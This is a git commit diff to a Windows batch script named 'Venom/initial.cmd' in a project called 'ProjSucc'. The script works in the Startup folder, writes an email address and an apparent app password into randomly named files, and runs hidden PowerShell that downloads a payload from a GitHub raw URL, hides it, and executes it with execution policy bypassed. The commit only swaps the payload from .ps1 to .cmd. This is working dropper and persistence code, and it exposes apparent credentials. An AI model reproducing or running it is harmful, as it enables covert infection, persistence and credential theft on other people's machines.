5949b9519052dbf2813c7f3a231e9a0f196ebde0
P0k3m0n-unleashed <pokemonunlaeshe@proton.me>
2025-04-23 23:51:17 -0800

    ProjSucc

--- Venom/initial.cmd
+++ Venom/initial.cmd
@@ -8,11 +8,11 @@ cd %STARTUP%
 echo goat3dmofo@gmail.com >> PkUbTvqXFIdB.txt
 echo qcihadixhgspywjw >> NzKnmxLrbsBw.txt
 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.ps1 -OutFile IVbaANzwiphH.ps1"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile IVbaANzwiphH.cmd"
 
-attrib +h "%STARTUP%/IVbaANzwiphH.ps1"
+attrib +h "%STARTUP%/IVbaANzwiphH.cmd"
 
-powershell -windowstyle hidden -ExecutionPolicy Bypass ./IVbaANzwiphH.ps1
+powershell -windowstyle hidden -ExecutionPolicy Bypass ./IVbaANzwiphH.cmd
 
 cd "%initial_dir%"
 
